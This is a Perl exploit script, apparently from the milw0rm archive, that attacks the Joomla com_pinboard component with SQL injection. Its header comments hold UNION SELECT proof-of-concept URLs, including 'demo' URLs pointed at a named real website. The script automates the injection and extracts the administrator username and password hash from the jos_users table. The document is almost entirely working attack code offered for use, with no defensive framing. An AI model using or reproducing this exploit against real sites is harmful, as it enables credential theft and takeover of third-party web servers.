#!/usr/bin/perl -w
# Joomla Component (com_pinboard) Remote SQL Injection
########################################
#[*] By : Stack
#POc
#http://site/index.php?option=com_pinboard&Itemid=35&action=showpic&task=-48%20union%20select%201,2,3,4,5,6,username,8,9,10%20from%20jos_users--
#http://site/index.php?option=com_pinboard&Itemid=35&action=showpic&task=-48%20union%20select%201,2,3,4,5,6,password,8,9,10%20from%20jos_users--
#Demo
#http://munimartin.at/index.php?option=com_pinboard&Itemid=35&action=showpic&task=-48%20union%20select%201,2,3,4,5,6,username,8,9,10%20from%20jos_users--
#http://munimartin.at/index.php?option=com_pinboard&Itemid=35&action=showpic&task=-48%20union%20select%201,2,3,4,5,6,password,8,9,10%20from%20jos_users--
########################################
system("color 02");
print "\t\t############################################################\n\n";
print "\t\t#       Joomla Component (com_pinboard) Remote SQL Injection    #\n\n";
print "\t\t#                             by Stack                        #\n\n";
print "\t\t############################################################\n\n";
use LWP::UserAgent;
die "Example: perl $0 http://victim.com/path/\n" unless @ARGV;
system("color f");
$user="username";
$pass="password";
$tab="jos_users";
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $ARGV[0] . "/index.php?option=com_pinboard&Itemid=35&action=showpic&task=-48+union+select+1,2,3,4,5,6,concat(CHAR(60,117,115,101,114,62),".$user.",CHAR(60,117,115,101,114,62),CHAR(60,112,97,115,115,62),".$pass.",CHAR(60,112,97,115,115,62)),8,9,10+from+".$tab."--";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content;
if ($answer =~ /<user>(.*?)<user>/){
        print "\nBrought to you by v4-team.com...\n";
        print "\n[+] Admin User : $1";
}
if ($answer =~/<pass>(.*?)<pass>/){print "\n[+] Admin Hash : $1\n\n";
print "\t\t#   Exploit has ben aported user and password hash   #\n\n";}
else{print "\n[-] Exploit Failed...\n";}

# milw0rm.com [2009-06-25]